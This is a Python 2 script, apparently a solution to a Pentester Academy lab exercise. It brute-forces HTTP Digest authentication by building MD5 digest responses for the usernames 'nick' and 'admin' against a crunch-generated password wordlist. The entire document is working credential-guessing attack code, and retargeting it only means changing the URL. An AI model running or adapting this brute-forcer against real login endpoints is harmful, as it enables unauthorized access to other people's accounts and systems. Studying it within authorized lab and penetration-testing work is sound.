#!/usr/bin/python

import requests
import hashlib
import sys
from termcolor import colored

U = ["nick","admin"]

'''
Use The Following Command To Generate wordlist
#crunch 5 5 xyz -o wordlist.txt
'''
p = open('wordlist.txt','r')
P = [x.strip() for x in p.readlines()]
p.close()

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/digest2/1"

for UserName in U:
	for Pass in P:
		Login = requests.get(url_base)
		Get_Header = Login

		realm = Get_Header.headers.get('www-authenticate').split('"')[1]
		nonce = Get_Header.headers.get('www-authenticate').split('"')[3]
		URI = "/lab/webapp/digest2/1"

		Hash1 = hashlib.md5(UserName+":"+realm+":"+Pass).hexdigest()
		Hash2 = hashlib.md5("GET:"+URI).hexdigest()
		HashResponse = hashlib.md5(Hash1+":"+nonce+":"+Hash2).hexdigest()

		Custome_Header = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"' %(UserName,realm,nonce,URI,HashResponse)
		CHeader = {'Authorization': Custome_Header}

		Login = requests.get(url_base, headers = CHeader)
		if Login.status_code == 200:
			print colored("Login with Username %s ... Password %s "%(UserName,Pass),"green")
			sys.exit(0)
		else:
			print "Login with Username %s ... Password %s ... Failed!"%(UserName,Pass)
